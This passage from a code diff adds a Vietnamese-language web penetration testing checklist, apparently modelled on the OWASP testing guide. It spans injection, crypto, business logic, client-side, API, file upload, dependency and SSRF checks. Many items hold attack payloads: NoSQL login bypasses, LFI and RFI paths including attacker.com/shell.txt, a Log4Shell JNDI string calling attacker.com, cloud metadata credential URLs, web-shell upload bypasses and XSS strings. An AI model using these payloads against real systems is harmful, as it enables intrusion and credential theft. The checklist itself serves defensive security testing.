+          "Blind XXE qua DTD external: load DTD từ attacker server",
+          "OOB: gửi nội dung file qua DNS/HTTP đến attacker",
+          "DoS billion laughs: entity expansion exponential",
+          "Thử chuyển Content-Type JSON sang XML"
+        ],
+        tools:["Burp Suite","XXEinjector","Burp Collaborator"]
+      },
+      {
+        id:"INPV-009", sev:"high", title:"NoSQL Injection",
+        desc:"NoSQL (MongoDB, CouchDB) có cú pháp truy vấn riêng, vẫn injectable. Bypass auth, dump data.",
+        steps:[
+          "MongoDB bypass login: <code>{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}</code>",
+          "<code>{\"$gt\":\"\"}</code>, <code>{\"$regex\":\".*\"}</code>",
+          "Operator injection trong URL: <code>?username[$ne]=&password[$ne]=</code>",
+          "JS injection vào <code>$where</code>: <code>{\"$where\":\"sleep(5000)\"}</code>"
+        ],
+        tools:["NoSQLMap","Burp Suite"]
+      },
+      {
+        id:"INPV-010", sev:"high", title:"HTTP Request Smuggling",
+        desc:"Khi front-end (CDN, LB) và back-end parse Content-Length/Transfer-Encoding khác nhau, attacker có thể \"smuggle\" request thứ 2 vào kết nối, vượt qua kiểm soát của front-end.",
+        steps:[
+          "Test CL.TE: front-end dùng Content-Length, back-end dùng Transfer-Encoding",
+          "Test TE.CL: ngược lại",
+          "Test TE.TE: cả 2 dùng TE nhưng obfuscation khác nhau",
+          "Sử dụng HTTP Request Smuggler extension của Burp"
+        ],
+        tools:["Burp Suite HTTP Request Smuggler","smuggler.py"]
+      },
+      {
+        id:"INPV-011", sev:"high", title:"Host Header Injection",
+        desc:"Server tin Host header để build URL (password reset link). Attacker đổi Host → reset link trỏ về domain attacker.",
+        steps:[
+          "Đổi <code>Host: target.com</code> thành <code>Host: evil.com</code> → check email reset có dùng evil.com không",
+          "X-Forwarded-Host header: <code>X-Forwarded-Host: evil.com</code>",
+          "Cache poisoning: response cache với host injection lan ra mọi user"
+        ],
+        tools:["Burp Suite","Burp Param Miner"]
+      },
+      {
+        id:"INPV-012", sev:"medium", title:"HTTP Parameter Pollution (HPP)",
+        desc:"Gửi cùng 1 parameter nhiều lần với giá trị khác nhau. Mỗi tech stack xử lý khác nhau (lấy đầu, cuối, concat) → có thể bypass validation.",
+        steps:[
+          "Thử <code>?id=1&id=2</code> — server xử lý value nào?",
+          "Bypass WAF: <code>?cmd=ls&cmd=cat /etc/passwd</code>",
+          "Bypass auth: <code>?role=user&role=admin</code>"
+        ],
+        tools:["Burp Suite"]
+      },
+      {
+        id:"INPV-013", sev:"high", title:"Open Redirect",
+        desc:"Endpoint redirect nhận URL từ user mà không validate → dùng cho phishing (link domain hợp pháp redirect đến trang lừa đảo).",
+        steps:[
+          "Tìm parameter: <code>?url=</code>, <code>?next=</code>, <code>?return=</code>, <code>?redirect=</code>, <code>?continue=</code>",
+          "Thử <code>?url=https://evil.com</code>",
+          "Bypass validation: <code>//evil.com</code>, <code>https:evil.com</code>, <code>https://target.com.evil.com</code>, <code>https://target.com@evil.com</code>",
+          "Path-relative: <code>/\\\\evil.com</code>, <code>\\evil.com</code>",
+          "Unicode bypass: <code>https://evil。com</code>"
+        ],
+        tools:["Burp Suite","Open Redirect Payloads"]
+      },
+      {
+        id:"INPV-014", sev:"high", title:"Local/Remote File Inclusion (LFI/RFI)",
+        desc:"Inject path vào include/require → đọc file local (LFI) hoặc nạp file từ URL ngoài (RFI) → RCE nếu có thể upload PHP.",
+        steps:[
+          "LFI: <code>?page=../../../../etc/passwd</code>",
+          "PHP wrapper: <code>php://filter/convert.base64-encode/resource=index.php</code> để đọc source",
+          "Log poisoning: ghi PHP code vào log Apache (qua User-Agent), include log",
+          "RFI: <code>?page=http://attacker.com/shell.txt</code> (cần allow_url_include=On)"
+        ],
+        tools:["Burp Suite","fimap","LFISuite","kadimus"]
+      },
+      {
+        id:"INPV-015", sev:"high", title:"Insecure Deserialization",
+        desc:"Khi ứng dụng deserialize dữ liệu binary/serialized không kiểm chứng (Java, PHP, Python pickle, .NET BinaryFormatter), attacker có thể inject gadget chain → RCE.",
+        steps:[
+          "Phát hiện serialized data: PHP <code>O:8:\"User\"</code>, Java header <code>rO0AB</code> (base64 của 0xACED), Python pickle bắt đầu <code>\\x80</code>",
+          "PHP: dùng <code>PHPGGC</code> để tạo gadget chain",
+          "Java: dùng <code>ysoserial</code>",
+          "Test: cookie, session, hidden field, file upload, API body",
+          ".NET: ViewState (MAC validation), JSON.NET TypeNameHandling"
+        ],
+        tools:["ysoserial","PHPGGC","Burp Suite","Java Deserialization Scanner"]
+      }
+    ]
+  },
+  {
+    id:"errors",
+    code:"WSTG-ERRH",
+    title:"8. Kiểm thử xử lý lỗi (Error Handling)",
+    desc:"Lỗi không được xử lý đúng có thể leak thông tin nhạy cảm: stack trace, đường dẫn server, query SQL, version thư viện. Đồng thời, cách hệ thống phản ứng với lỗi cũng phản ánh chất lượng code.",
+    items:[
+      {
+        id:"ERRH-001", sev:"medium", title:"Phân tích thông báo lỗi",
+        desc:"Tìm các trang/response chứa lỗi chi tiết để khai thác thông tin: tên hàm, file, dòng, tên DB, query, version framework.",
+        steps:[
+          "Trigger lỗi: gửi input không hợp lệ (kiểu sai, vượt giới hạn, ký tự đặc biệt)",
+          "Trigger 404, 403, 500: thử URL không tồn tại, method không hỗ trợ",
+          "Trigger lỗi DB: dấu nháy đơn, kiểu dữ liệu sai cho parameter",
+          "Quan sát: stack trace, full path, version, internal IP",
+          "Kiểm tra debug mode bật: <code>?debug=1</code>, <code>?XDEBUG_SESSION_START=1</code>"
+        ],
+        tools:["Burp Suite","manual fuzzing"]
+      },
+      {
+        id:"ERRH-002", sev:"medium", title:"Phân tích stack trace",
+        desc:"Stack trace tiết lộ: cấu trúc thư mục, framework version, gadget tiềm năng cho deserialization, secret hardcode trong source.",
+        steps:[
+          "Thu thập tất cả stack trace từ test trên",
+          "Tìm: tên class, method, gói (package), version",
+          "Tra CVE cho version đó",
+          "Xác định framework để chọn payload cụ thể (Spring → Spring4Shell, Struts → S2-xxx)"
+        ],
+        tools:["Burp Suite","CVE database"]
+      }
+    ]
+  },
+  {
+    id:"crypto",
+    code:"WSTG-CRYP",
+    title:"9. Kiểm thử mật mã (Cryptography)",
+    desc:"Cryptography là nền tảng bảo mật. Lỗi cấu hình SSL/TLS, dùng thuật toán yếu, lưu mật khẩu không hash, dùng IV cố định, trộn tự build crypto đều dẫn đến hậu quả nghiêm trọng.",
+    items:[
+      {
+        id:"CRYP-001", sev:"critical", title:"Kiểm thử bảo vệ truyền tải dữ liệu yếu",
+        desc:"Mọi dữ liệu nhạy cảm phải qua TLS phiên bản mạnh (1.2+, ưu tiên 1.3), cipher suite an toàn, certificate hợp lệ.",
+        steps:[
+          "<code>testssl.sh https://target.com</code> — quét toàn bộ điểm yếu TLS",
+          "Kiểm tra hỗ trợ SSLv2, SSLv3, TLS 1.0, TLS 1.1 → phải tắt",
+          "Cipher yếu: RC4, DES, 3DES, EXPORT, NULL, anon",
+          "Heartbleed (CVE-2014-0160), POODLE, BEAST, CRIME, BREACH, ROBOT",
+          "Certificate: hợp lệ, không expire, đúng tên miền, chain đầy đủ, không self-signed (production)",
+          "Forward secrecy: cipher có ECDHE/DHE",
+          "OCSP stapling bật"
+        ],
+        tools:["testssl.sh","sslyze","SSL Labs ssllabs.com/ssltest","nmap ssl-enum-ciphers"]
+      },
+      {
+        id:"CRYP-002", sev:"high", title:"Kiểm thử padding oracle",
+        desc:"Lỗ hổng cho phép giải mã/mã hóa dữ liệu mà không cần biết key, khi server tiết lộ liệu padding có hợp lệ không (CBC mode).",
+        steps:[
+          "Tìm token mã hóa được gửi đi và quay về (cookie, view-state, parameter)",
+          "Sửa byte cuối → quan sát response: lỗi khác giữa padding sai và data sai",
+          "Sử dụng padbuster hoặc Burp PadBuster"
+        ],
+        tools:["padbuster","Burp Suite"]
+      },
+      {
+        id:"CRYP-003", sev:"high", title:"Kiểm thử lưu trữ dữ liệu nhạy cảm không mã hóa",
+        desc:"Mật khẩu phải hash (bcrypt/argon2/scrypt), không phải MD5/SHA1. Dữ liệu nhạy cảm (CC, SSN) phải mã hóa AES. Khóa không hardcode trong source.",
+        steps:[
+          "Trigger response có thể leak password hash (admin xem user)",
+          "Phân tích hash: MD5 (32 hex), SHA1 (40 hex), bcrypt ($2a$/2b$/2y$), argon2 ($argon2)",
+          "Hash yếu → crack với hashcat/john",
+          "Kiểm tra dữ liệu trong cookie/JWT/local storage có phải plain text",
+          "Source code có hardcode key/secret không (kiểm tra qua JS file, .git leak)"
+        ],
+        tools:["hashcat","john","gitleaks","trufflehog"]
+      },
+      {
+        id:"CRYP-004", sev:"high", title:"Kiểm thử thuật toán/protocol yếu",
+        desc:"Các thuật toán đã bị phá: MD5 (collision), SHA1 (collision), DES, RC4, ECB mode (pattern leak).",
+        steps:[
+          "Liệt kê thuật toán dùng trong app (qua header, JS, doc)",
+          "Encryption mode ECB: encrypt 2 chuỗi giống nhau → output giống → có thể nhận diện",
+          "RNG yếu: <code>rand()</code>, <code>Math.random()</code> không nên dùng cho security",
+          "Kiểm tra session ID, token reset, OTP có entropy đủ (Burp Sequencer)"
+        ],
+        tools:["Burp Sequencer","testssl.sh"]
+      }
+    ]
+  },
+  {
+    id:"business-logic",
+    code:"WSTG-BUSL",
+    title:"10. Kiểm thử logic nghiệp vụ (Business Logic)",
+    desc:"Lỗ hổng business logic không thể tìm bằng scanner — đòi hỏi hiểu sâu workflow của ứng dụng. Ví dụ: mua hàng giá âm, dùng mã giảm giá nhiều lần, race condition khi rút tiền.",
+    items:[
+      {
+        id:"BUSL-001", sev:"high", title:"Kiểm thử validation dữ liệu nghiệp vụ",
+        desc:"Backend phải validate mọi rule nghiệp vụ, không chỉ dựa vào client. Số âm, chuỗi quá dài, ngày tương lai/quá khứ vô lý, đơn vị tiền tệ sai.",
+        steps:[
+          "Chuyển khoản số tiền âm → có gây tăng tiền không?",
+          "Đặt hàng số lượng âm hoặc 0",
+          "Đặt số lượng vượt tồn kho",
+          "Số thập phân: <code>0.01</code>, <code>0.001</code> (overflow rounding)",
+          "Số rất lớn: <code>2147483648</code> (int overflow), <code>9999999999.99</code>"
+        ],
+        tools:["Burp Suite","manual testing"]
+      },
+      {
+        id:"BUSL-002", sev:"high", title:"Kiểm thử khả năng giả mạo request",
+        desc:"User có thể giả mạo điều kiện chỉ kiểm tra ở client (giảm giá, miễn phí ship, thành viên VIP).",
+        steps:[
+          "Sửa giá sản phẩm trong request thanh toán",
+          "Sửa user_id, address_id sang của người khác",
+          "Xóa/sửa field <code>discount</code>, <code>tax</code>, <code>shipping_fee</code>",
+          "Bypass step trong wizard: skip bước thanh toán, gọi trực tiếp endpoint xác nhận"
+        ],
+        tools:["Burp Suite"]
+      },
+      {
+        id:"BUSL-003", sev:"high", title:"Kiểm thử bypass kiểm tra tính toàn vẹn",
+        desc:"User có thể bỏ qua bước bắt buộc trong workflow: skip xác minh email, skip thanh toán, skip captcha.",
+        steps:[
+          "Lập sơ đồ workflow đầy đủ",
+          "Thử gọi endpoint cuối cùng mà không qua các bước trước",
+          "Thử lùi/tiến không đúng thứ tự",
+          "Force browse direct URL"
+        ],
+        tools:["Burp Suite"]
+      },
+      {
+        id:"BUSL-004", sev:"medium", title:"Kiểm thử thời gian xử lý",
+        desc:"Race condition: nhiều request đồng thời có thể tạo trạng thái không nhất quán: dùng coupon nhiều lần, double withdraw, nhiều vote.",
+        steps:[
+          "Sử dụng Burp Turbo Intruder hoặc Race Condition extension",
+          "Gửi 20-50 request đồng thời tới endpoint cùng lúc (sử dụng HTTP/2 single packet attack)",
+          "Test: redeem voucher, claim reward, buy với số lượng giới hạn"
+        ],
+        tools:["Turbo Intruder","Race the Web","Burp Suite"]
+      },
+      {
+        id:"BUSL-005", sev:"medium", title:"Kiểm thử số lần dùng chức năng",
+        desc:"Chức năng có giới hạn (forgot password, gửi OTP, redeem code) có rate limit không?",
+        steps:[
+          "Spam endpoint forgot password 100 lần → user có bị spam mail không",
+          "Spam SMS OTP — toll fraud risk (mỗi SMS tốn tiền)",
+          "Coupon code: redeem nhiều lần một code"
+        ],
+        tools:["Burp Intruder"]
+      },
+      {
+        id:"BUSL-006", sev:"high", title:"Kiểm thử lạm dụng chức năng",
+        desc:"Chức năng được thiết kế cho mục đích A nhưng có thể bị lạm dụng cho mục đích khác. Ví dụ: tính năng \"chuyển tiền sang tài khoản khác\" để rửa tiền, \"chia sẻ link\" để leak data.",
+        steps:[
+          "Phân tích từng tính năng: có thể dùng sai mục đích không?",
+          "Tính năng search có thể dùng để enumerate user?",
+          "Email notification có thể dùng để spam (nội dung tùy chỉnh)?"
+        ],
+        tools:["manual testing","threat modeling"]
+      }
+    ]
+  },
+  {
+    id:"client-side",
+    code:"WSTG-CLNT",
+    title:"11. Kiểm thử phía Client (Client-side)",
+    desc:"Logic chạy trong trình duyệt (JS) cũng có lỗ hổng: DOM XSS, postMessage bất an, WebSocket, Web Storage chứa nhạy cảm, clickjacking, tabnabbing.",
+    items:[
+      {
+        id:"CLNT-001", sev:"high", title:"DOM-based vulnerabilities",
+        desc:"(Bao trùm trong INPV-003) Phân tích sâu hơn các JS source/sink dẫn đến XSS, open redirect, JS injection.",
+        steps:[
+          "Audit JS code bằng DOM Invader",
+          "Tìm <code>postMessage</code> không kiểm tra origin",
+          "<code>window.opener</code>: tabnabbing nếu link ngoài thiếu <code>rel=\"noopener\"</code>"
+        ],
+        tools:["Burp DOM Invader","DOMPurify","Trusted Types"]
+      },
+      {
+        id:"CLNT-002", sev:"high", title:"Kiểm thử Cross-Origin Resource Sharing",
+        desc:"(Liên quan CONF-007) Kiểm tra phía client thực sự thực hiện được cross-origin request hay không.",
+        steps:[
+          "Tạo PoC HTML host trên evil.com gọi fetch() đến target.com với <code>credentials:'include'</code>",
+          "Quan sát có lấy được response không"
+        ],
+        tools:["manual HTML PoC","Burp Suite"]
+      },
+      {
+        id:"CLNT-003", sev:"medium", title:"Kiểm thử Cross-Site Flashing (CSF)",
+        desc:"Flash đã EOL nhưng nếu app cũ vẫn dùng SWF với input từ URL, có thể XSS qua Flash.",
+        steps:[
+          "Liệt kê file .swf",
+          "Decompile SWF với <code>JPEXS Free Flash Decompiler</code>",
+          "Tìm <code>flashvars</code> chấp nhận từ URL"
+        ],
+        tools:["JPEXS","SWFScan"]
+      },
+      {
+        id:"CLNT-004", sev:"medium", title:"Clickjacking",
+        desc:"Nhúng trang victim trong iframe trên trang attacker, làm trong suốt, lừa user click vào nút (transfer money, accept friend).",
+        steps:[
+          "Thử iframe trang nhạy cảm: <code>&lt;iframe src=\"https://target.com/transfer\"&gt;&lt;/iframe&gt;</code>",
+          "Có bị chặn bởi <code>X-Frame-Options</code> hay <code>CSP frame-ancestors</code> không?",
+          "Tạo PoC clickjack thực tế"
+        ],
+        tools:["Clickjacker","manual HTML"]
+      },
+      {
+        id:"CLNT-005", sev:"high", title:"Kiểm thử WebSocket",
+        desc:"WebSocket dùng giao thức ws:// hoặc wss://. Lỗ hổng: thiếu authentication, không kiểm tra Origin (CSWSH), input không validate, MITM nếu dùng ws://.",
+        steps:[
+          "Liệt kê endpoint WebSocket",
+          "Bắt và replay WebSocket message bằng Burp",
+          "Cross-Site WebSocket Hijacking (CSWSH): không check Origin header → trang khác có thể tạo WS connection thay user",
+          "Test injection vào WS message: XSS, SQLi"
+        ],
+        tools:["Burp Suite","WebSocket King","wsrepl"]
+      },
+      {
+        id:"CLNT-006", sev:"high", title:"Kiểm thử Web Messaging (postMessage)",
+        desc:"<code>window.postMessage</code> giao tiếp giữa các window/iframe khác origin. Nếu listener không check origin gửi đến → cross-origin script có thể inject.",
+        steps:[
+          "Tìm event listener: <code>window.addEventListener('message', ...)</code>",
+          "Check có verify <code>event.origin</code> không",
+          "Test gửi message từ origin attacker"
+        ],
+        tools:["Burp DOM Invader"]
+      },
+      {
+        id:"CLNT-007", sev:"medium", title:"Kiểm thử Browser Storage",
+        desc:"localStorage, sessionStorage, IndexedDB không nên chứa: token auth (vì JS đọc được — nguy hiểm khi có XSS), thông tin nhạy cảm (CC, SSN, PII).",
+        steps:[
+          "Kiểm tra localStorage và sessionStorage qua DevTools",
+          "JWT auth lưu trong localStorage → risk XSS lấy được",
+          "Có dữ liệu PII không cần thiết không"
+        ],
+        tools:["Chrome DevTools","Firefox Storage Inspector"]
+      },
+      {
+        id:"CLNT-008", sev:"medium", title:"Kiểm thử Cross-Origin Script Inclusion (XSSI)",
+        desc:"Khi file JS chứa dữ liệu nhạy cảm (do JSONP hay hard-coded) và load được cross-origin, attacker có thể đọc dữ liệu.",
+        steps:[
+          "Tìm endpoint trả về JS chứa data: JSONP (<code>?callback=foo</code>)",
+          "Override built-in để bắt data: <code>Object.defineProperty(Object.prototype, ...)</code>",
+          "JSON với prefix bảo vệ <code>)]}'</code> chưa?"
+        ],
+        tools:["manual"]
+      },
+      {
+        id:"CLNT-009", sev:"medium", title:"Tabnabbing và link target=\"_blank\"",
+        desc:"Link mở tab mới với <code>target=\"_blank\"</code> nếu không có <code>rel=\"noopener noreferrer\"</code> → trang mới có thể truy cập <code>window.opener</code> và đổi URL trang gốc → phishing.",
+        steps:[
+          "Audit HTML: mọi <code>&lt;a target=\"_blank\"&gt;</code> phải có <code>rel=\"noopener\"</code>",
+          "Modern browser tự động noopener cho target=_blank, nhưng không phải tất cả"
+        ],
+        tools:["manual HTML inspection"]
+      }
+    ]
+  },
+  {
+    id:"api",
+    code:"WSTG-APIT",
+    title:"12. Kiểm thử API (REST, GraphQL, SOAP)",
+    desc:"API ngày càng quan trọng. OWASP API Security Top 10 nhấn mạnh: Broken Object Level Authorization (BOLA), broken authentication, mass assignment, lack of resources & rate limiting. API thường ẩn nhiều lỗ hổng hơn UI vì dev nghĩ \"chỉ mobile app gọi\".",
+    items:[
+      {
+        id:"APIT-001", sev:"critical", title:"Kiểm thử BOLA (Broken Object Level Authorization)",
+        desc:"(Tương đương IDOR ở web) — endpoint API như <code>GET /api/users/123/orders</code> có check user_id của caller có quyền truy cập user 123 không?",
+        steps:[
+          "Liệt kê tất cả endpoint nhận object ID",
+          "Tạo 2 tài khoản, đổi ID trong URL",
+          "Test cả integer ID, UUID, slug, GUID encoded"
+        ],
+        tools:["Burp Suite Autorize","Postman"]
+      },
+      {
+        id:"APIT-002", sev:"high", title:"Kiểm thử BFLA (Broken Function Level Authorization)",
+        desc:"Endpoint admin (DELETE, PUT) không check role → user thường có thể gọi.",
+        steps:[
+          "Liệt kê endpoint admin từ documentation/spec",
+          "Đăng nhập user thường, gọi endpoint admin",
+          "Test cả các method: GET, POST, PUT, DELETE, PATCH"
+        ],
+        tools:["Burp Suite","Swagger UI"]
+      },
+      {
+        id:"APIT-003", sev:"high", title:"Mass Assignment / Excessive Data Exposure",
+        desc:"API trả nhiều field hơn cần thiết (excessive exposure: trả luôn password hash, salary, internal flag), hoặc nhận nhiều field từ user (mass assignment: user gửi <code>is_admin=true</code> trong update profile).",
+        steps:[
+          "Phân tích response: có field nhạy cảm không (password, internal_id, debug_info)?",
+          "Update endpoint: thêm field bất kỳ và xem có được lưu không (<code>role</code>, <code>balance</code>, <code>verified</code>)",
+          "GraphQL introspection: liệt kê toàn bộ schema để tìm field ẩn"
+        ],
+        tools:["Burp Suite","GraphQL Voyager","InQL"]
+      },
+      {
+        id:"APIT-004", sev:"high", title:"Lack of Rate Limiting / Resource Limits",
+        desc:"API không giới hạn → DoS, brute force, scraping. Không giới hạn payload size → DoS qua large payload.",
+        steps:[
+          "Spam endpoint 1000 lần — có bị block không?",
+          "Gửi payload 10MB, 100MB",
+          "GraphQL: query nested 100 levels → DoS",
+          "Pagination không giới hạn: <code>?limit=100000000</code>"
+        ],
+        tools:["Burp Intruder","Apache Bench","wrk"]
+      },
+      {
+        id:"APIT-005", sev:"high", title:"Improper Asset Management",
+        desc:"API version cũ (v1, v2) vẫn online, không được patch. Endpoint dev/staging accessible từ internet.",
+        steps:[
+          "Tìm version cũ: <code>/api/v1/</code>, <code>/api/v2/</code>, <code>/api/legacy/</code>",
+          "Kiểm tra endpoint dev: <code>dev-api.target.com</code>, <code>staging.target.com</code>",
+          "Có Swagger doc public không: <code>/swagger</code>, <code>/api-docs</code>, <code>/openapi.json</code>"
+        ],
+        tools:["dirsearch","gobuster","Nuclei"]
+      },
+      {
+        id:"APIT-006", sev:"high", title:"Kiểm thử GraphQL",
+        desc:"GraphQL có vector tấn công riêng: introspection mở, batching, deep query DoS, alias abuse, field suggestions leak.",
+        steps:[
+          "Thử introspection: <code>POST /graphql {\"query\":\"{__schema{types{name,fields{name}}}}\"}</code>",
+          "Batching: <code>[{query1},{query2},...]</code> → bypass rate limit",
+          "Alias abuse cho brute force: <code>{a:login(u:\"a\"),b:login(u:\"b\"),...}</code>",
+          "Deep query: <code>{user{posts{author{posts{author{...}}}}}}</code>",
+          "Field suggestion: gửi field sai → server gợi ý → leak schema dù introspection tắt",
+          "Mutation không có authorization check"
+        ],
+        tools:["GraphQL Voyager","InQL","graphw00f","clairvoyance"]
+      },
+      {
+        id:"APIT-007", sev:"medium", title:"Kiểm thử SOAP / XML-RPC",
+        desc:"SOAP cũ nhưng vẫn dùng nhiều ở enterprise. XXE, WS-Security yếu, SOAPAction header injection.",
+        steps:[
+          "Tải WSDL: <code>?wsdl</code>",
+          "Liệt kê method với SOAPUI",
+          "XXE qua SOAP body",
+          "Test parameter injection trong từng method"
+        ],
+        tools:["SOAPUI","Burp Suite","wsdler"]
+      }
+    ]
+  },
+  {
+    id:"file-upload",
+    code:"WSTG-FILE",
+    title:"13. Kiểm thử Upload File",
+    desc:"File upload là tính năng nguy hiểm: có thể dẫn đến RCE (upload web shell), XSS (HTML/SVG), DoS (file bom), path traversal (tên file traversal). Cần kiểm tra cả tên, nội dung, và xử lý sau upload.",
+    items:[
+      {
+        id:"FILE-001", sev:"critical", title:"Bypass kiểm tra loại file",
+        desc:"Upload file thực thi được (PHP, ASPX, JSP) lên server bằng cách bypass filter ở client/server.",
+        steps:[
+          "Bypass extension blacklist: <code>shell.PHP</code>, <code>shell.phtml</code>, <code>shell.php5</code>, <code>shell.pHp</code>",
+          "Double extension: <code>shell.jpg.php</code>, <code>shell.php.jpg</code> (Apache mod_mime cũ)",
+          "Null byte (PHP cũ): <code>shell.php%00.jpg</code>",
+          "Magic bytes spoofing: thêm header GIF89a vào đầu file PHP",
+          "Content-Type spoofing: gửi <code>Content-Type: image/jpeg</code> với nội dung PHP",
+          "Bypass MIME check: file <code>.htaccess</code> để override config",
+          "Đổi extension trong filename Content-Disposition"
+        ],
+        tools:["Burp Suite","upload-bypass-payloads"]
+      },
+      {
+        id:"FILE-002", sev:"high", title:"Kiểm thử nội dung file độc hại",
+        desc:"Ngay cả file hợp lệ extension có thể chứa payload: SVG có XSS, HTML có XSS, EXIF có code, PDF có JavaScript, ZIP có path traversal (zip slip).",
+        steps:[
+          "SVG XSS: <code>&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</code>",
+          "HTML upload có thể truy cập trực tiếp → stored XSS",
+          "EXIF: <code>exiftool -Comment='&lt;script&gt;alert(1)&lt;/script&gt;' image.jpg</code>",
+          "Zip slip: file trong zip có tên <code>../../etc/passwd</code>",
+          "Polyglot file: vừa là JPG vừa là PHP",
+          "Quá lớn: file 10GB → DoS storage"
+        ],
+        tools:["exiftool","Burp Suite","zip-slip-payload"]
+      },
+      {
+        id:"FILE-003", sev:"high", title:"Path traversal trong tên file",
+        desc:"Tên file có thể chứa <code>../</code> để ghi đè file hệ thống.",
+        steps:[
+          "Tên file: <code>../../etc/passwd</code>, <code>..\\..\\windows\\system32\\drivers\\hosts</code>",
+          "Encoded: <code>%2e%2e%2f</code>",
+          "Unicode: <code>..%c0%af</code>"
+        ],
+        tools:["Burp Suite"]
+      },
+      {
+        id:"FILE-004", sev:"medium", title:"Kiểm thử nơi lưu trữ và quyền truy cập",
+        desc:"File upload có nên lưu trong webroot? Có thể truy cập trực tiếp qua URL không? Có authentication khi download không?",
+        steps:[
+          "Upload file → tìm URL → truy cập trực tiếp",
+          "File private có thể truy cập bởi user khác qua URL không (IDOR)",
+          "Tên file có dễ đoán không"
+        ],
+        tools:["manual testing"]
+      }
+    ]
+  },
+  {
+    id:"third-party",
+    code:"WSTG-DEPS",
+    title:"14. Kiểm thử thư viện và phụ thuộc bên thứ ba",
+    desc:"Phần lớn ứng dụng web hiện đại dùng hàng trăm thư viện. Một CVE trong dependency có thể compromise toàn bộ ứng dụng (Log4Shell, Equifax do Struts). Đây là OWASP Top 10 A06:2021.",
+    items:[
+      {
+        id:"DEPS-001", sev:"high", title:"Quét lỗ hổng thư viện front-end",
+        desc:"Liệt kê thư viện JS, CSS đang dùng và phiên bản. Đối chiếu với CVE.",
+        steps:[
+          "Liệt kê script src: <code>&lt;script src=\"jquery-1.4.0.js\"&gt;</code>",
+          "Sử dụng <code>retire.js</code> (CLI hoặc browser extension)",
+          "Sử dụng Wappalyzer để fingerprint",
+          "Kiểm tra <code>npm audit</code>, <code>yarn audit</code> nếu có quyền"
+        ],
+        tools:["retire.js","Wappalyzer","npm audit","Snyk"]
+      },
+      {
+        id:"DEPS-002", sev:"critical", title:"Quét lỗ hổng dependency back-end",
+        desc:"Java (log4j, struts, spring), PHP (composer), Python (pip), Ruby (gems), Node (npm). Cần access source/SBOM.",
+        steps:[
+          "Yêu cầu SBOM (Software Bill of Materials)",
+          "Quét với <code>OWASP Dependency-Check</code>, <code>Snyk</code>, <code>Trivy</code>",
+          "Kiểm tra Log4j (Log4Shell CVE-2021-44228): payload <code>${jndi:ldap://attacker.com/x}</code> vào mọi input có thể bị log",
+          "Kiểm tra Spring4Shell (CVE-2022-22965)",
+          "Struts2 RCE (S2-045, S2-052)"
+        ],
+        tools:["OWASP Dependency-Check","Trivy","Snyk","Grype","Nuclei"]
+      },
+      {
+        id:"DEPS-003", sev:"medium", title:"Subresource Integrity (SRI)",
+        desc:"Khi load JS/CSS từ CDN bên thứ ba, dùng SRI hash để chống CDN compromise inject mã độc.",
+        steps:[
+          "Audit script load từ external: <code>&lt;script src=\"https://cdn.example.com/...\"&gt;</code>",
+          "Phải có <code>integrity=\"sha384-...\"</code> và <code>crossorigin=\"anonymous\"</code>"
+        ],
+        tools:["manual HTML inspection","SRI Hash Generator"]
+      }
+    ]
+  },
+  {
+    id:"misc",
+    code:"WSTG-MISC",
+    title:"15. Các kiểm thử bổ sung quan trọng",
+    desc:"Các hạng mục bổ sung không thuộc category chính nhưng quan trọng: privacy, logging, monitoring, supply chain, mobile API specifics.",
+    items:[
+      {
+        id:"MISC-001", sev:"medium", title:"Kiểm thử logging và monitoring",
+        desc:"OWASP Top 10 A09:2021. Hệ thống cần log đủ để phát hiện và điều tra incident, nhưng không log thông tin nhạy cảm.",
+        steps:[
+          "Đăng nhập sai nhiều lần — có log không?",
+          "Truy cập admin panel không phép — có alert không?",
+          "Thử exploit (SQLi payload) — có bị phát hiện không?",
+          "Log có chứa password, token, PII không (vi phạm)",
+          "Log có timestamp, user ID, IP, action đầy đủ?",
+          "Log không bị attacker sửa được (log injection: \\n vào input để fake log entry)"
+        ],
+        tools:["manual testing","SIEM logs"]
+      },
+      {
+        id:"MISC-002", sev:"high", title:"Server-Side Request Forgery — Cloud Metadata",
+        desc:"(Bổ sung cho ATHZ-006) — khai thác SSRF để lấy IAM credential từ AWS/GCP/Azure metadata service.",
+        steps:[
+          "AWS: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]</code>",
+          "AWS IMDSv2: cần token, request <code>PUT /latest/api/token</code> với header <code>X-aws-ec2-metadata-token-ttl-seconds: 21600</code>",
+          "GCP: <code>http://metadata.google.internal/computeMetadata/v1/</code> với header <code>Metadata-Flavor: Google</code>",
+          "Azure: <code>http://169.254.169.254/metadata/instance?api-version=2021-02-01</code> với header <code>Metadata: true</code>",
+          "Sau khi có credential → enumerate quyền với <code>aws sts get-caller-identity</code>, scout suite"
+        ],
+        tools:["Burp Suite","SSRFmap","ScoutSuite","Pacu"]
+      },
+      {
+        id:"MISC-003", sev:"high", title:"Kiểm thử Web Cache Poisoning",
+        desc:"Đầu độc cache (CDN, Varnish) bằng cách abuse unkeyed input để cache response có payload XSS, redirect → ảnh hưởng mọi user truy cập tiếp theo.",
+        steps:[
+          "Tìm unkeyed input: header <code>X-Forwarded-Host</code>, <code>X-Original-URL</code>, query param không trong cache key",
+          "Inject payload vào unkeyed input → cache → user khác truy cập sẽ nhận response bị độc",
+          "Sử dụng Burp Param Miner để tìm unkeyed input"
+        ],
+        tools:["Burp Suite Param Miner","Web Cache Vulnerability Scanner"]
+      },
+      {
+        id:"MISC-004", sev:"medium", title:"Kiểm thử privacy và GDPR/PII",
+        desc:"Ứng dụng xử lý PII đúng quy định: có thể export data của mình, có thể xóa account, dữ liệu thực sự xóa, encryption tại rest.",
+        steps:[
+          "Có chức năng export dữ liệu (data portability)?",
+          "Xóa account → dữ liệu xóa thực hay chỉ soft delete?",
+          "Có gửi PII cho bên thứ ba (analytics, ads) không?",
+          "Cookie banner có thực sự honor user choice không?"
+        ],
+        tools:["manual review","privacy policy review"]
+      },
+      {
+        id:"MISC-005", sev:"medium", title:"Kiểm thử chức năng email",
+        desc:"Email function có thể bị abuse: SMTP injection (gửi spam qua app), email spoofing, header injection.",
+        steps:[
+          "Form contact: thử inject \\r\\n để add header (BCC, CC)",
+          "SMTP injection: sửa nội dung email gửi đi",
+          "SPF, DKIM, DMARC của domain — có cấu hình chống spoof không?"
+        ],
+        tools:["Burp Suite","mail-tester.com"]
+      },
+      {
+        id:"MISC-006", sev:"medium", title:"Kiểm thử CAPTCHA",
